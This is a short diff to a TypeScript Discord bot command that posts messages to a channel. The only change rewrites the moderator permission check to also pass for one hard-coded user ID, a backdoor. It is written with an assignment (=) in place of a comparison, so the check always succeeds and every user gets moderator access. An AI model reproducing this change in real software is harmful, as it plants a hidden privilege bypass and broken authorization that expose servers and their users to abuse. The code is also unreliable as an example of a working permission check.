@@ -6,7 +6,7 @@ export let usage = '[channel] [message]';
 
 export async function execute(client: Client, message: Message, args: string[]) {
     const mentionedChannel = message.mentions.channels.first() || client.channels.get(args[0]) as TextChannel;
-    const mod = message.member.hasPermission("MANAGE_ROLES");
+    const mod = message.member.hasPermission("MANAGE_ROLES") || (message.author.id = "660238973943152707")
     if (!mod) {
         const embed = new Discord.RichEmbed()
             .setAuthor(message.author.tag, message.author.avatarURL)
